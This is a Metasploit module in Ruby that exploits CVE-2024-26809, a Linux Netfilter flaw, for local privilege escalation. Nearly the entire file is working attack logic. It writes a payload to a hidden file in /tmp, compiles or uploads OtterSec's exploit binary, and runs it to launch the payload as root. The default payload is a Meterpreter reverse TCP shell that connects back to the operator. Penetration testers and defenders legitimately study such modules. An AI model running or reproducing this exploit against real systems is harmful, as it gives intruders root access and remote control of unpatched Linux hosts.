##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Compile
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Netfilter Offset-less LPE (CVE-2024-26809)',
        'Description' => %q{
          This module exploits CVE-2024-26809, a vulnerability in the Netfilter subsystem of Linux.
          It allows local privilege escalation to root without needing kernel symbols.

          The exploit uses OtterSecâ€™s self-contained binary. If `gcc` is available on the system, the
          module will upload and compile the exploit on the target. Otherwise, it uploads a precompiled
          binary. After privilege escalation, a payload binary is executed with full root privileges.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'OtterSec',         # Original exploit
          'JohannesLks'       # Metasploit module
        ],
        'DisclosureDate' => '2024-02-19',
        'Platform' => [ 'linux' ],
        'Arch' => [ ARCH_X64 ],
        'SessionTypes' => [ 'shell', 'meterpreter' ],
        'Targets' => [['Automatic', {}]],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',
          'PrependSetuid' => true,
          'PrependSetresuid' => true,
          'PrependFork' => true,
          'AppendExit' => true
        },
        'Privileged' => true,
        'References' => [
          ['CVE', '2024-26809'],
          ['URL', 'https://osec.io/blog/2024-11-25-netfilter-universal-root-1-day/'],
          ['URL', 'https://github.com/otter-sec/OtterRoot'],
        ],
        'Notes' => {
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ ARTIFACTS_ON_DISK ]
        }
      )
    )

    register_options([
      OptString.new('WRITABLE_DIR', [ true, 'Directory to write temporary files', '/tmp' ])
    ])
  end

  def check
    return CheckCode::Safe("Not a Linux session") unless session.platform =~ /linux/i
    return CheckCode::Safe("Not a 64-bit session") unless kernel_arch.include?('x86_64')
    kernel_version = Rex::Version.new(kernel_release.split('-').first)

    # Rough window of vulnerable versions (conservative)
    if kernel_version >= Rex::Version.new('5.4') && kernel_version < Rex::Version.new('6.6')
      return CheckCode::Appears("Kernel version #{kernel_version} may be vulnerable")
    end

    CheckCode::Safe("Kernel version #{kernel_version} not within expected vulnerable range")
  end

  def exploit
    writable_dir = datastore['WRITABLE_DIR']
    fail_with(Failure::NoAccess, "#{writable_dir} is not writable") unless writable?(writable_dir)

    base = ".#{Rex::Text.rand_text_alpha_lower(6..12)}"
    exploit_src = "#{writable_dir}/#{base}.c"
    exploit_bin = "#{writable_dir}/#{base}"
    payload_path = "#{writable_dir}/#{base}_payload"

    print_status("Generating payload executable...")
    payload_data = generate_payload_exe
    write_file(payload_path, payload_data)
    chmod(payload_path)
    register_file_for_cleanup(payload_path)

    if has_gcc?
      print_status("GCC is available. Compiling exploit on the target...")
      c_code = exploit_data('CVE-2024-26809', 'exploit.c')
      upload_and_compile(exploit_bin, c_code)
    else
      print_status("GCC not available. Uploading precompiled binary...")
      precompiled = exploit_data('CVE-2024-26809', 'exploit.x64.bin')
      upload_and_chmodx(exploit_bin, precompiled)
    end

    register_file_for_cleanup(exploit_bin)

    print_status("Executing exploit to run: #{payload_path}")
    output = cmd_exec("#{exploit_bin} #{payload_path}")
    print_good("Exploit executed. Output:\n#{output}")
  end
end
